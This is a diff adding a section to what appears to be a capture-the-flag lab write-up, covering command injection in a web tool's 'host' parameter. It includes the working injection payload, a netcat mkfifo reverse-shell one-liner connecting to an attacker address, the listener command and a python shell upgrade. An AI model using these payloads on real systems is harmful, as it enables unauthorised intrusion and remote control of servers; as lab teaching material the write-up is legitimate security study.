@@ -102,3 +102,40 @@ The welcome.php page is interesting, too :thinking:
 
 ## command injection and a reverse shell
 
+The welcome page shows a tool which appears to execute commands on the system - *command injection* seems a very likely next step.
+
+Using the *repeater* tool in burpsuite we find that when we add `;` after the *host* parameter we can follow it with system commands which get executed :smile:
+
+`host=8.8.8.8;whoami`
+
+![ci1](./images/9.png)
+
+This is a simple *command injection* vulnerability and we can now try to find a way to exploit it - getting a reverse shell to work would be nice :thumbsup:
+
+I found a netcat reverse shell worked.
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f
+```
+
+I used this command in the repeater tool and *url encoded* it by highlighting it and then pressing `CTRL + U` before sending it.
+
+> [!NOTE]
+> Remember to start a netcat listener on your attacking machine before you send the above command `sudo nc -nlvp 4444` :roll_eyes:
+
+![ci2](./images/10.png)
+
+The shell we get is (unsurprisingly) running under the *www-data* user which has low privileges.
+
+![ci3](./images/11.png)
+
+Before continuing, it makes sense to upgrade our shell. There are different ways to do this, but if *python* is installed on the victim system then we can use it to upgrade.
+
+```bash
+python --version
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+```
+
+Now we have a (slightly) more stable shell, it is time to get enumerating the box :detective: so we can find ways to elevate our privileges :arrow_up:
+
